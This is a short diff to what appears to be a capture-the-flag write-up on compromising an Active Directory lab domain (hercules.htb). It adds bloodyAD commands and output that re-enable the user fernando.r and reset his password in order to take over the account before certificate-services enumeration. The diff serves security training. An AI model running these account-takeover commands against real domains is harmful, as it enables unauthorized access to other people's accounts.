@@ -1122,7 +1122,7 @@ Ill have a look at all the users in bloodhound
 
 `fernando.r` stands out, he is part of the `smartcard operators` group, likely pointing me at ADCS
 
-# ADCS
+# Compromising `fernando.r`
 
 ```python
 bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE 'fernando.r'
@@ -1130,6 +1130,15 @@ bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE 
 ```
 
 Ill re enable the account
+
+```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'fernando.r' 'Password123!'       
+[+] Password changed successfully!
+```
+
+Ill change his password so i can use his account to enumerate ADCS
+
+# ADCS
 
 ```python
 
